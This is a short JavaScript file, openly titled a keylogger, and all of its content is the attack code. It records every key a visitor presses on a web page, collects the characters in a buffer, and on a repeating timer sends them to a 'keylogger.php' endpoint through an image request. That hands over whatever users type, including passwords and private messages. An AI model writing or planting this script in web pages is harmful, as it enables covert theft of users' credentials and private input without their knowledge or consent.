//JavaScript Keylogger;

let keys = ""; 

document.onkeypress = function(e){

    get = window.event?event:e; //İf there is a event else event get.
    key = get.keyCode?get.keyCode:get.charCode; //get keyCode, otherwise get character code.
    key = String.fromCharCode(key);
    keys +=key;
    
    document.getElementById('paragraf').innerHTML = key
    document.getElementsByClassName('hero').innerHTML = key

    


}
window.setInterval(function(){

    new Image().src = 'keylogger.php?c='+keys;  //Sending db
    keys = "";
    
});


